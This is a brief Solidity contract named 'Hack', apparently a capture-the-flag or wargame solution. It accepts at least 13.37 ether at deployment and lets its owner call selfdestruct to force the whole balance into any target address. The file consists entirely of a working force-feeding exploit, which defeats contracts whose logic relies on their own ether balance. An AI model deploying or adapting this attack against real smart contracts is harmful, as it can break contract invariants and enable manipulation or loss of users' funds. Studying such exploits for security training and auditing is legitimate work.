// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Hack {
    address immutable owner;

    constructor() payable {
        require(msg.value >= 13.37 ether, "Not enough funds");
        owner = msg.sender;
    }

    function hack(address target) external payable {
        require(msg.sender == owner, "!owner");

        selfdestruct(payable(target));
    }
}